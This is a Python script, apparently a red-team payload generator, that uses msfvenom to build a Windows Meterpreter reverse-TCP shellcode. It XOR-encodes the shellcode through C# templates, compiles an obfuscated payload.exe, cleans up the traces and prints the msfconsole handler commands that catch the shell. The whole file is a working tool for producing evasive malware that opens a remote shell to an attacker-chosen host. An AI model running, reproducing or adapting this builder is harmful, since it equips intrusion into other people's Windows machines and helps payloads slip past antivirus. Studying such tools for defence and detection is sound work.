#!/bin/env python3
import sys
import random
import string
import os
import time
import subprocess
import argparse

base_dir = os.getcwd()

payload = 'windows/x64/meterpreter/reverse_tcp'

def generateEncodedShell(encoder,ip,port,key):
	# Generate msfvenom payload
	subprocess.run("msfvenom -a x64 --platform Windows -p {} LHOST={} LPORT={} EXITFUNC=thread -f csharp -o output.cs > /dev/null 2>&1".format(payload,ip,port).split(' '), stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
	# Read msfvenom payload (output.cs)
	shellcode = open('{}/output.cs'.format(base_dir),'r')
	shelcode_data = shellcode.read()
	# Open the original C# Code for the encoder
	original = open('{}/{}/template'.format(base_dir,encoder),'r')
	original = original
	data = original.read()
	# Replace specific bits with the newly generated shellcode and key
	data = data.replace('CHANGEME', shelcode_data)
	data = data.replace('SPECIALKEY', key)
	# Open a new file and write the replaced text here
	template = open('{}/{}/Program.cs'.format(base_dir,encoder),'w+')
	template.write(data)
	# Close files
	original.close()
	template.close()
	shellcode.close()

def generatePayload(encoder,obfuscater,key):
	# Build the XOR version of the shellcode and save it to output.shellcode
	os.system('cd {}/{}/ && dotnet run > output.shellcode'.format(base_dir,encoder))
	# Open the shellcode 
	shellcode = open('{}/{}/output.shellcode'.format(base_dir,encoder),'r')
	shelcode_data = shellcode.read()
	# Open the original C# code for the payload
	original = open('{}/{}/template'.format(base_dir,obfuscater),'r')
	data = original.read()
	# Replace specific bits with newly generated shellcode and key
	data = data.replace('CHANGEME', shelcode_data)
	data = data.replace('SPECIALKEY', key)
	original.close()
	template = open('{}/{}/Program.cs'.format(base_dir,obfuscater),'w+')
	template.write(data)
	shellcode.close()

def cleanUp(encoder,obfuscater):
	os.system("cd {}/{} && dotnet publish -c Release -r win10-x64 > /dev/null 2>&1".format(base_dir,obfuscater))
	os.system("cp {}/{}/bin/Release/net45/win10-x64/{}.exe {}/payload.exe".format(base_dir,obfuscater,obfuscater,base_dir))
	time.sleep(0.5)
	os.system("rm {}/{}/Program.cs && rm {}/{}/Program.cs && rm -rf {}/{}/bin".format(base_dir,obfuscater,base_dir,encoder,base_dir,obfuscater))
	os.system("rm {}/{}/output.shellcode".format(base_dir,encoder))
	os.system("rm -rf {}/{}/bin".format(base_dir,encoder))
	os.system("rm {}/output.cs".format(base_dir))

parser = argparse.ArgumentParser(description='Generate obfuscated payloads.')
requiredNamed = parser.add_argument_group('required named arguments')
requiredNamed.add_argument('-ip', dest='ip',help='IP Address for a reverse shell',required=True)
requiredNamed.add_argument('-port', dest='port',help='Port number for a reverse shell',required=True)
requiredNamed.add_argument('-key', dest='key',help='XOR key for reverse shell (example: 0xff)',required=True)

args = parser.parse_args()
if not args.ip or not args.port or not args.key:
	parser.print_help(sys.stderr)
	exit()
print("""
                                                                                                                                                                              
                                                                                                                                                                              
        GGGGGGGGGGGGG                                                                                                      tttt                                               
     GGG::::::::::::G                                                                                                   ttt:::t                                               
   GG:::::::::::::::G                                                                                                   t:::::t                                               
  G:::::GGGGGGGG::::G                                                                                                   t:::::t                                               
 G:::::G       GGGGGG    eeeeeeeeeeee    nnnn  nnnnnnnn        eeeeeeeeeeee    rrrrr   rrrrrrrrr   aaaaaaaaaaaaa  ttttttt:::::ttttttt       ooooooooooo   rrrrr   rrrrrrrrr   
G:::::G                ee::::::::::::ee  n:::nn::::::::nn    ee::::::::::::ee  r::::rrr:::::::::r  a::::::::::::a t:::::::::::::::::t     oo:::::::::::oo r::::rrr:::::::::r  
G:::::G               e::::::eeeee:::::een::::::::::::::nn  e::::::eeeee:::::eer:::::::::::::::::r aaaaaaaaa:::::at:::::::::::::::::t    o:::::::::::::::or:::::::::::::::::r 
G:::::G    GGGGGGGGGGe::::::e     e:::::enn:::::::::::::::ne::::::e     e:::::err::::::rrrrr::::::r         a::::atttttt:::::::tttttt    o:::::ooooo:::::orr::::::rrrrr::::::r
G:::::G    G::::::::Ge:::::::eeeee::::::e  n:::::nnnn:::::ne:::::::eeeee::::::e r:::::r     r:::::r  aaaaaaa:::::a      t:::::t          o::::o     o::::o r:::::r     r:::::r
G:::::G    GGGGG::::Ge:::::::::::::::::e   n::::n    n::::ne:::::::::::::::::e  r:::::r     rrrrrrraa::::::::::::a      t:::::t          o::::o     o::::o r:::::r     rrrrrrr
G:::::G        G::::Ge::::::eeeeeeeeeee    n::::n    n::::ne::::::eeeeeeeeeee   r:::::r           a::::aaaa::::::a      t:::::t          o::::o     o::::o r:::::r            
 G:::::G       G::::Ge:::::::e             n::::n    n::::ne:::::::e            r:::::r          a::::a    a:::::a      t:::::t    tttttto::::o     o::::o r:::::r            
  G:::::GGGGGGGG::::Ge::::::::e            n::::n    n::::ne::::::::e           r:::::r          a::::a    a:::::a      t::::::tttt:::::to:::::ooooo:::::o r:::::r            
   GG:::::::::::::::G e::::::::eeeeeeee    n::::n    n::::n e::::::::eeeeeeee   r:::::r          a:::::aaaa::::::a      tt::::::::::::::to:::::::::::::::o r:::::r            
     GGG::::::GGG:::G  ee:::::::::::::e    n::::n    n::::n  ee:::::::::::::e   r:::::r           a::::::::::aa:::a       tt:::::::::::tt oo:::::::::::oo  r:::::r            
        GGGGGG   GGGG    eeeeeeeeeeeeee    nnnnnn    nnnnnn    eeeeeeeeeeeeee   rrrrrrr            aaaaaaaaaa  aaaa         ttttttttttt     ooooooooooo    rrrrrrr            
                                                                                                                                                                              
                                                                                                                                                                              
                                                                                                                                                                              
                                                                                                                                                                              
                                                                                                                                                                              
            by Fawaz - Twitter: @Q8fawazo                                                                                                                                                                 
                                                                                                                                                                              
""")
print('> Generator goes brrrr')
print('> Generating encoded shellcode')
generateEncodedShell('xor',args.ip,args.port,args.key)
print('> Generating payload')
generatePayload('xor','Payload',args.key)
print('> Cleanup')
cleanUp('xor','Payload')
print('> Open msfconsole and run the following:\n\n')
print('use exploit/multi/handler')
print('set payload {}'.format(payload))
print('set LHOST {}'.format(args.ip))
print('set LPORT {}'.format(args.port))
print('set EXITFUNC thread')
print('run -j')
print('\nYou should see payload.exe now')
exit()




#print(args.accumulate(args.integers))